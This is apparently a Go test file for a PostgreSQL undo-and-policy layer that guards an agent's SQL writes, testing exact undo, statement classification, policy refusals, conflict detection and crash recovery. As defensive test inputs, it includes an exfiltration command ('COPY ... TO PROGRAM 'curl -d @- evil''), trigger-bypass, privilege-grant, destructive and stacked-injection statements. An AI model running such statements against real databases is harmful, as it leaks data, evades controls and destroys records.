package postgres

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/jackc/pgx/v5"

	"undolayer/internal/model"
	"undolayer/internal/policy"
	"undolayer/internal/tx"
)

// Tests run against a real server: UNDOLAYER_TEST_PG=postgres://postgres:pw@localhost:55432/postgres
func server(t *testing.T) string {
	dsn := os.Getenv("UNDOLAYER_TEST_PG")
	if dsn == "" {
		t.Skip("set UNDOLAYER_TEST_PG to run PostgreSQL tests")
	}
	return dsn
}

const fixture = `
CREATE TABLE u(id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY, email text, plan text, seen timestamptz,
               balance numeric(20,6), ratio float8, tags text[], meta jsonb, avatar bytea,
               label text GENERATED ALWAYS AS (upper(plan)) STORED);
CREATE TABLE o(id serial PRIMARY KEY, uid bigint REFERENCES u(id) ON DELETE CASCADE, total int);
CREATE TABLE audit(id serial PRIMARY KEY, what text);
CREATE FUNCTION audit_fn() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN INSERT INTO audit(what) VALUES ('u:' || NEW.id); RETURN NEW; END $$;
CREATE TRIGGER u_audit AFTER UPDATE ON u FOR EACH ROW EXECUTE FUNCTION audit_fn();
INSERT INTO u(email, plan, seen, balance, ratio, tags, meta, avatar)
  SELECT 'u' || i, CASE WHEN i % 2 = 1 THEN 'free' ELSE 'pro' END, timestamptz '2024-01-01 10:00:00.123456+05:30' + i * interval '1 day',
         12345678901234.123456 + i, CASE i WHEN 1 THEN 'NaN'::float8 WHEN 2 THEN '-0'::float8 WHEN 3 THEN 1e308 ELSE 1.0/3 END,
         ARRAY['a', NULL, 'c'], jsonb_build_object('n', i, 'deep', jsonb_build_array(1, 'x', NULL)), decode('00ff' || lpad(to_hex(i), 2, '0'), 'hex')
  FROM generate_series(1, 30) i;
INSERT INTO o(uid, total) SELECT (i % 30) + 1, i FROM generate_series(0, 39) i;
`

func setup(t *testing.T) (string, *tx.Manager) {
	base := server(t)
	ctx := context.Background()
	admin, err := pgx.Connect(ctx, base)
	if err != nil {
		t.Fatal(err)
	}
	db := strings.ToLower(strings.ReplaceAll(t.Name(), "/", "_"))
	_, _ = admin.Exec(ctx, "DROP DATABASE IF EXISTS "+db+" WITH (FORCE)")
	if _, err := admin.Exec(ctx, "CREATE DATABASE "+db); err != nil {
		t.Fatal(err)
	}
	admin.Close(ctx)
	dsn := base[:strings.LastIndex(base, "/")+1] + db
	c, err := pgx.Connect(ctx, dsn)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.Exec(ctx, fixture); err != nil {
		t.Fatal(err)
	}
	c.Close(ctx)
	if err := Install(dsn); err != nil {
		t.Fatal(err)
	}
	m, err := tx.NewManager(filepath.Join(t.TempDir(), "state"), policy.Empty())
	if err != nil {
		t.Fatal(err)
	}
	m.Register(New(dsn))
	return dsn, m
}

// snap: every row of every user table as Postgres renders it, plus columns/indexes/triggers.
func snap(t *testing.T, dsn string) []string {
	ctx := context.Background()
	c, err := pgx.Connect(ctx, dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close(ctx)
	var out []string
	rows, _ := c.Query(ctx, `SELECT c.oid::regclass::text FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
		WHERE n.nspname = 'public' AND c.relkind = 'r' ORDER BY 1`)
	var tables []string
	for rows.Next() {
		var s string
		_ = rows.Scan(&s)
		tables = append(tables, s)
	}
	rows.Close()
	for _, tb := range tables {
		var s *string
		if err := c.QueryRow(ctx, fmt.Sprintf("SELECT string_agg(to_jsonb(t)::text, E'\\n' ORDER BY to_jsonb(t)::text) FROM %s t", tb)).Scan(&s); err != nil {
			t.Fatal(err)
		}
		v := ""
		if s != nil {
			v = *s
		}
		out = append(out, tb+":"+v)
	}
	var cat string
	_ = c.QueryRow(ctx, `SELECT string_agg(x, ',' ORDER BY x) FROM (
		SELECT attrelid::regclass || '.' || attname || ':' || format_type(atttypid, atttypmod) AS x FROM pg_attribute a
		JOIN pg_class c ON c.oid = a.attrelid JOIN pg_namespace n ON n.oid = c.relnamespace
		WHERE n.nspname = 'public' AND attnum > 0 AND NOT attisdropped
		UNION ALL SELECT 'idx:' || indexrelid::regclass FROM pg_index i JOIN pg_class c ON c.oid = i.indrelid
		JOIN pg_namespace n ON n.oid = c.relnamespace WHERE n.nspname = 'public'
		UNION ALL SELECT 'trg:' || tgname FROM pg_trigger WHERE NOT tgisinternal) s`).Scan(&cat)
	return append(out, cat)
}

func TestPGExactUndo(t *testing.T) {
	dsn, m := setup(t)
	s0 := snap(t, dsn)
	x := m.Begin("everything")
	stmts := []string{
		"WITH x AS (SELECT id FROM u WHERE id < 4) UPDATE u SET plan = 'gold', ratio = ratio / 2 WHERE id IN (SELECT id FROM x)",
		"DELETE FROM u AS z WHERE z.id = 5", // cascades into o
		"WITH d AS (DELETE FROM o WHERE total > 35 RETURNING *) SELECT count(*) FROM d",
		"INSERT INTO u(email, plan) VALUES ('new', 'pro') ON CONFLICT DO NOTHING",
		"UPDATE u SET meta = meta || '{\"k\": [1, 2.50, null]}', tags = tags || ARRAY['z'], avatar = NULL, seen = seen + interval '1 microsecond' WHERE id = 7",
		"UPDATE u SET balance = balance / 3 WHERE id BETWEEN 8 AND 9",
		"MERGE INTO o USING (SELECT 1 AS id) s ON o.id = s.id WHEN MATCHED THEN UPDATE SET total = 999",
		"ALTER TABLE u ADD COLUMN nick text", "UPDATE u SET nick = 'n' WHERE id = 1",
		"CREATE TABLE extra(id int PRIMARY KEY, v text)", "INSERT INTO extra VALUES (1, 'x')", "DELETE FROM extra",
		"CREATE INDEX ix_u_email ON u(email)",
	}
	for _, s := range stmts {
		r, err := x.Call("sql", "execute", map[string]any{"sql": s})
		if err != nil {
			t.Fatalf("%s: %v", s, err)
		}
		if strings.HasPrefix(s, "DELETE FROM u AS z") && fmt.Sprint(r.(map[string]any)["rows_affected"]) != "3" {
			t.Fatalf("cascade not captured: %v", r) // the user and both of their orders (i = 4 and i = 34)
		}
	}
	if _, err := x.Commit(); err != nil {
		t.Fatal(err)
	}
	if reflect.DeepEqual(snap(t, dsn), s0) {
		t.Fatal("commit changed nothing")
	}
	rep, err := x.Undo("")
	if err != nil || rep.State != model.Undone {
		t.Fatalf("undo: %v %+v", err, rep)
	}
	got := snap(t, dsn)
	for i := range got {
		if got[i] != s0[i] {
			t.Fatalf("not restored exactly:\n got %.400s\nwant %.400s", got[i], s0[i])
		}
	}
}

func TestPGClassificationFromTheParser(t *testing.T) {
	cases := map[string]string{
		"WITH x AS (DELETE FROM a RETURNING *) SELECT * FROM x": "is_write",
		"COMMIT":                                   "transaction_control",
		"SET session_replication_role = replica":   "pragma_set",
		"COPY a TO PROGRAM 'curl -d @- evil'":      "copy_external",
		"DO $$ BEGIN DELETE FROM a; END $$":        "opaque_code",
		"GRANT ALL ON a TO public":                 "privilege_change",
		"TRUNCATE a":                               "destroys_schema",
		"ALTER TABLE a DROP COLUMN b":              "destroys_schema",
		"DROP TABLE a":                             "destroys_schema",
		"ALTER TABLE a RENAME TO b":                "renames_schema",
		"EXPLAIN ANALYZE DELETE FROM a":            "is_write",
		"ALTER TABLE a ALTER COLUMN b TYPE bigint": "schema_unsupported",
	}
	for sql, fact := range cases {
		f, err := Analyze(sql)
		if err != nil {
			t.Fatal(err)
		}
		v := f[fact]
		if v != true && !(fact == "pragma_set" && len(v.([]string)) > 0) {
			t.Errorf("%s: %s = %v", sql, fact, v)
		}
	}
	if f, _ := Analyze("SELECT count(*) FROM a WHERE b > now() - interval '1 day'"); f["is_write"] != false {
		t.Error("plain SELECT classified as a write")
	}
}

func TestPGPolicyRefusesEscapesAndDiscardsAlone(t *testing.T) {
	dsn, m := setup(t)
	m.Policy = policy.Default()
	x := m.Begin("t")
	if _, err := x.Call("sql", "execute", map[string]any{"sql": "UPDATE u SET plan = 'gold' WHERE id = 1"}); err != nil {
		t.Fatal(err)
	}
	for _, s := range []string{"COMMIT", "SET session_replication_role = replica", "COPY u TO PROGRAM 'cat'",
		"GRANT ALL ON u TO public", "TRUNCATE o", "ALTER TABLE u DROP COLUMN email", "DROP TABLE o",
		"UPDATE o SET total = 0; DROP TABLE o"} {
		_, err := x.Call("sql", "execute", map[string]any{"sql": s})
		var pv *model.PolicyViolation
		if !errors.As(err, &pv) {
			t.Fatalf("%s was not refused: %v", s, err)
		}
	}
	if _, err := x.Commit(); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	c, _ := pgx.Connect(ctx, dsn)
	defer c.Close(ctx)
	var gold, zero int
	_ = c.QueryRow(ctx, "SELECT count(*) FROM u WHERE plan = 'gold'").Scan(&gold)
	_ = c.QueryRow(ctx, "SELECT count(*) FROM o WHERE total = 0").Scan(&zero)
	if gold != 1 || zero != 1 {
		t.Fatalf("expected only the allowed update: gold=%d zeros=%d", gold, zero)
	}
}

func TestPGSalamiAndConflict(t *testing.T) {
	dsn, m := setup(t)
	m.Policy = policy.Default()
	x := m.Begin("t")
	for _, w := range []string{"id <= 10", "id > 10 AND id <= 20", "id > 20"} {
		if _, err := x.Call("sql", "execute", map[string]any{"sql": "UPDATE u SET plan = 'x' WHERE " + w}); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := x.Commit(); err == nil {
		t.Fatal("rewriting 100% of a table in slices committed without approval")
	}
	if _, err := x.Rollback("human declined"); err != nil {
		t.Fatal(err)
	}
	m.Policy = policy.Empty()
	y := m.Begin("t2")
	if _, err := y.Call("sql", "execute", map[string]any{"sql": "UPDATE u SET plan = 'agent' WHERE id = 3"}); err != nil {
		t.Fatal(err)
	}
	if _, err := y.Commit(); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	c, _ := pgx.Connect(ctx, dsn)
	defer c.Close(ctx)
	_, _ = c.Exec(ctx, "UPDATE u SET plan = 'human' WHERE id = 3")
	rep, err := y.Undo("")
	if err != nil || len(rep.Conflicts) == 0 {
		t.Fatalf("expected a conflict: %v %+v", err, rep)
	}
	var plan string
	_ = c.QueryRow(ctx, "SELECT plan FROM u WHERE id = 3").Scan(&plan)
	if plan != "human" {
		t.Fatal("human edit overwritten")
	}
}

func TestPGOtherSessionsUnaffected(t *testing.T) {
	dsn, m := setup(t)
	x := m.Begin("t")
	if _, err := x.Call("sql", "execute", map[string]any{"sql": "UPDATE u SET plan = 'staged' WHERE id = 2"}); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	c, _ := pgx.Connect(ctx, dsn) // an ordinary application session
	defer c.Close(ctx)
	var plan string
	_ = c.QueryRow(ctx, "SELECT plan FROM u WHERE id = 2").Scan(&plan)
	if plan == "staged" {
		t.Fatal("staged write visible to another session")
	}
	if _, err := c.Exec(ctx, "UPDATE u SET email = 'app-write' WHERE id = 20"); err != nil { // app writes keep working
		t.Fatal(err)
	}
	var logs int
	_ = c.QueryRow(ctx, "SELECT count(*) FROM pg_class WHERE relname = 'undolayer_log'").Scan(&logs)
	if logs > 1 {
		t.Fatal("capture log leaked outside the agent's session")
	}
	_, _ = x.Rollback("t")
}

// A crash between journaling the intent and recording the commit: the server says whether
// COMMIT happened (txid_status), and only a commit that happened is undone.
func TestPGInterruptedCommitIsResolvedByTheServer(t *testing.T) {
	dsn, m := setup(t)
	before := snap(t, dsn)
	c, _ := m.Connector("sql")
	ic := c.(tx.Intender)

	// killed before COMMIT
	x := m.Begin("t")
	if _, err := x.Call("sql", "execute", map[string]any{"sql": "UPDATE o SET total = total + 1"}); err != nil {
		t.Fatal(err)
	}
	intent, err := ic.Intent(x)
	if err != nil || intent == nil {
		t.Fatalf("no intent: %v", err)
	}
	raw, _ := json.Marshal(intent)
	for k, h := range x.Handles {
		if cc, ok := h.(interface{ CloseForCrash() }); ok {
			cc.CloseForCrash()
		}
		delete(x.Handles, k)
	}
	if err := ic.UndoInFlight(raw); err != nil {
		t.Fatalf("a commit that never happened: %v", err)
	}
	if !reflect.DeepEqual(before, snap(t, dsn)) {
		t.Fatal("undo of a commit that never happened changed the database")
	}

	// killed after COMMIT, before the record was journaled
	y := m.Begin("t")
	if _, err := y.Call("sql", "execute", map[string]any{"sql": "UPDATE o SET total = total + 1"}); err != nil {
		t.Fatal(err)
	}
	intent, _ = ic.Intent(y)
	raw, _ = json.Marshal(intent)
	if _, err := c.Commit(y); err != nil {
		t.Fatal(err)
	}
	if reflect.DeepEqual(before, snap(t, dsn)) {
		t.Fatal("commit did not apply")
	}
	if err := ic.UndoInFlight(raw); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(before, snap(t, dsn)) {
		t.Fatal("the commit that happened was not undone")
	}
}
